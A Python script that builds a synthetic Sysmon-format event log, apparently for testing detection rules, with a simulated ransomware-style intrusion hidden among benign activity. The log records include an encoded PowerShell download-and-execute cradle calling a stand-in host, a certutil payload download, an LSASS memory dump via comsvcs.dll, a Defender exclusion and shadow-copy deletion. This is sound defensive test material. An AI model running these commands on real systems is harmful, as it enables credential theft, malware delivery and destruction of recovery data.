#!/usr/bin/env python3
"""
Build samples/attack_chain.jsonl: a simulated intrusion on host WS-FIN-07 hidden
among benign activity on three hosts. Field names follow Sysmon's schema.

Storyline (2026-11-18, UTC):
  10:02  User opens Invoice_Nov.docm -> macro launches hidden, encoded PowerShell
  10:02  PowerShell downloads a stage-2 script and connects to 198.51.100.10
  10:03  certutil pulls svc.exe into C:\\Users\\Public
  10:04  Discovery: whoami /all, net group "domain admins", nltest /domain_trusts
  10:05  Persistence: scheduled task + Run key; Defender exclusion added
  10:07  svc.exe dumps LSASS via comsvcs.dll MiniDump
  10:09  svc.exe deletes shadow copies and drops a Startup-folder shortcut (ransomware prep)
Benign noise includes look-alikes that the rule filters must suppress.
"""
import base64
import json
import uuid
import zlib
from datetime import datetime, timedelta
from pathlib import Path

T0 = datetime(2026, 11, 18, 9, 30, 0)
events = []
_ns = uuid.UUID("6f1c2d3e-0000-4000-8000-000000000000")


def guid(name):  # deterministic GUIDs so the sample is reproducible
    return "{" + str(uuid.uuid5(_ns, name)).upper() + "}"


def ts(minutes, seconds=0):
    return (T0 + timedelta(minutes=minutes, seconds=seconds)).strftime("%Y-%m-%d %H:%M:%S.000")


def proc(t, host, name, image, cmd, parent_name, parent_image, parent_cmd="", user="CORP\\a.sharma"):
    events.append({"EventID": 1, "UtcTime": t, "Computer": host, "ProcessGuid": guid(host + name),
                   "ProcessId": zlib.crc32(name.encode()) % 9000 + 1000, "Image": image, "CommandLine": cmd,
                   "User": user, "ParentProcessGuid": guid(host + parent_name),
                   "ParentImage": parent_image, "ParentCommandLine": parent_cmd})


def other(eid, t, host, **fields):
    events.append({"EventID": eid, "UtcTime": t, "Computer": host, **fields})


H = "WS-FIN-07.corp.local"
SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
stage2 = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.ps1')"
enc = base64.b64encode(stage2.encode("utf-16-le")).decode()

# ---------------- attack chain ----------------
proc(ts(32), H, "word", WORD, f'"{WORD}" /n "C:\\Users\\a.sharma\\Downloads\\Invoice_Nov.docm"',
     "explorer", EXPLORER)
proc(ts(32, 9), H, "ps1", PS, f"powershell.exe -nop -w hidden -enc {enc}", "word", WORD)
other(3, ts(32, 11), H, Image=PS, ProcessGuid=guid(H + "ps1"), Initiated="true", Protocol="tcp",
      SourceIp="10.10.4.27", DestinationIp="198.51.100.10", DestinationPort=80)
proc(ts(33), H, "certutil", SYS + "certutil.exe",
     "certutil.exe -urlcache -split -f http://198.51.100.10/svc.exe C:\\Users\\Public\\svc.exe", "ps1", PS)
proc(ts(34), H, "cmd1", SYS + "cmd.exe", 'cmd.exe /c "whoami /all & net group "domain admins" /domain & nltest /domain_trusts"', "ps1", PS)
proc(ts(34, 1), H, "whoami", SYS + "whoami.exe", "whoami /all", "cmd1", SYS + "cmd.exe")
proc(ts(34, 2), H, "net", SYS + "net.exe", 'net group "domain admins" /domain', "cmd1", SYS + "cmd.exe")
proc(ts(34, 4), H, "nltest", SYS + "nltest.exe", "nltest /domain_trusts", "cmd1", SYS + "cmd.exe")
proc(ts(35), H, "schtasks", SYS + "schtasks.exe",
     'schtasks /create /tn "OneDriveUpdate" /tr "C:\\Users\\Public\\svc.exe" /sc onlogon /rl highest', "ps1", PS)
other(13, ts(35, 5), H, EventType="SetValue", Image=PS, ProcessGuid=guid(H + "ps1"),
      TargetObject="HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
      Details="C:\\Users\\Public\\svc.exe")
proc(ts(35, 20), H, "ps2", PS, 'powershell.exe -c "Add-MpPreference -ExclusionPath C:\\Users\\Public"', "ps1", PS)
proc(ts(36), H, "svc", "C:\\Users\\Public\\svc.exe", "C:\\Users\\Public\\svc.exe", "ps1", PS)
proc(ts(37), H, "rundll", SYS + "rundll32.exe",
     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\d.bin full", "svc",
     "C:\\Users\\Public\\svc.exe")
other(10, ts(37, 1), H, SourceImage=SYS + "rundll32.exe", SourceProcessGuid=guid(H + "rundll"),
      TargetImage=SYS + "lsass.exe", GrantedAccess="0x1fffff")
proc(ts(39), H, "vss", SYS + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "svc",
     "C:\\Users\\Public\\svc.exe")
other(11, ts(39, 30), H, Image="C:\\Users\\Public\\svc.exe", ProcessGuid=guid(H + "svc"),
      TargetFilename="C:\\Users\\a.sharma\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk")

# ---------------- benign noise (incl. near-misses the filters must suppress) ----------------
for i, host in enumerate(["WS-FIN-07.corp.local", "WS-HR-02.corp.local", "SRV-APP-01.corp.local"]):
    for m in range(0, 50, 4):
        proc(ts(m, i), host, f"chrome{m}", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
             "chrome.exe --type=renderer", "explorer", EXPLORER)
    other(10, ts(5, i), host, SourceImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
          SourceProcessGuid=guid(host + "defender"), TargetImage=SYS + "lsass.exe", GrantedAccess="0x1410")
proc(ts(10), "WS-HR-02.corp.local", "whoami_admin", SYS + "whoami.exe", "whoami", "cmd_admin", SYS + "cmd.exe",
     user="CORP\\helpdesk")
proc(ts(12), "WS-HR-02.corp.local", "msi_task", SYS + "schtasks.exe",
     'schtasks /create /tn "AdobeUpdate" /tr "C:\\ProgramData\\Adobe\\ARM\\armsvc.exe" /sc daily',
     "msiexec", SYS + "msiexec.exe")
other(13, ts(14), "WS-HR-02.corp.local", EventType="SetValue",
      Image="C:\\Users\\r.koirala\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
      TargetObject="HKU\\S-1-5-21-1009\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
      Details='"C:\\Users\\r.koirala\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background')
proc(ts(20), "SRV-APP-01.corp.local", "ps_admin", PS, "powershell.exe -File C:\\Scripts\\health_check.ps1",
     "svchost", SYS + "svchost.exe", user="CORP\\svc_monitor")
other(3, ts(20, 3), "SRV-APP-01.corp.local", Image=PS, ProcessGuid=guid("SRV-APP-01.corp.localps_admin"),
      Initiated="true", Protocol="tcp", SourceIp="10.10.1.5", DestinationIp="10.10.1.20", DestinationPort=443)
proc(ts(25), "WS-FIN-07.corp.local", "excel", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
     '"EXCEL.EXE" "Q3_budget.xlsx"', "explorer", EXPLORER)
proc(ts(26), "WS-FIN-07.corp.local", "splwow", SYS + "splwow64.exe", "splwow64.exe 8192", "excel",
     "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE")

events.sort(key=lambda e: e["UtcTime"])
out = Path(__file__).with_name("attack_chain.jsonl")
out.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
print(f"Wrote {len(events)} events to {out}")
